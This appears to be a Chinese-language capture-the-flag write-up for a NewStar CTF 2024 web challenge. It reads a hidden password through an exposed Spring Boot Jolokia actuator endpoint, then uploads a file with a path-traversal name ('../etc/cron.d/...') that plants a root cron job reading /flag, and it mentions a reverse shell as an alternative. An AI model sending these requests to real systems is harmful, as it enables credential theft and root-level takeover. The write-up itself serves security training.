---
titleTemplate: ":title | WriteUp - NewStar CTF 2024"
---

# 隐藏的密码

根据题目隐藏的密码可能是存在信息泄露，进行目录扫描，可以扫到 `env` 和 `jolokia` 端点，可以找到 `caef11.passwd` 属性是隐藏的

```http
POST /actuator/jolokia HTTP/1.1
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["caef11.passwd"]}
```

读到密码后，根据题目描述和属性的名字可得用户名为 `caef11`

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=--abc
Cookie: PHPSESSID=kc8dfc8njb57d311qlmh7ij0d2; JSESSIONID=E1EF0128A9A427C2593DA64FAE3E2102

----abc
Content-Disposition: form-data; name="file"; filename="../etc/cron.d/testt"
Content-Type: application/octet-stream

*/1 * * * * root cat /flag | xargs -I {} touch /{}

----abc--
```

通过写定时任务（计划任务）的方式，以 flag 为文件名在根目录创建新文件，通过 `ls` 查看 flag，或者反弹 shell 也可以
